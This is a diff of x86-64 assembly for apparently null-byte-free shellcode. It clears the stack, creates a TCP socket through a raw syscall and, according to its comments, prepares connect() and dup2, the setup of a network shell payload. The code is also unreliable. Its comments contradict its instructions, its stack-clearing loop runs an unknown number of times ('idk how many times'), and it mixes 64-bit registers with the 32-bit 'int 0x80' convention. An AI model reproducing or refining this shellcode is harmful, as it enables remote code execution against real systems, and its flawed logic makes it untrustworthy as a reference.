@@ -2,25 +2,23 @@ section .text
 global _start
 
 _start:
-    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
-    push rax ; use rdx as clear buffer
-    pop rdx ; clear rdx before counting
+    xor rdx, rdx ; clear rax, this results in no 0 bytes in the shellcode
+    add al, '0'
+    push rax ; push pop instead of mov rcx, rax (shorter)
+    pop rcx
 
 _cleanstack:
     push rdx
-    inc ax
-    cmp ax, 359 ; ax needs to be 359; sys_socket for _socket
-    jnz _cleanstack
+    loop _cleanstack ; idk how many times :p, we'll have to get lucky that rcx is populated
 
-    pop rbx
-    pop rcx
+    pop rbx ; clear rbx with our zero data from the
 _socket:
     ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
     ; they result in extra 0 bytes in the shell code
     mov bl, 2 ; AF_INET
     mov cl, 1 ; SOCK_STREAM
     mov dl, 6 ; IPPROTO_TCP
-    ; mov ax, 359; sys_socket
+    mov ax, 359; sys_socket
     int 0x80 ; syscall
     push rax ; save file descriptor to rdi because connect() expects it there, we can also use rdi in dup2
     pop rdi ; push and pop is smaller than mov rdi, rax
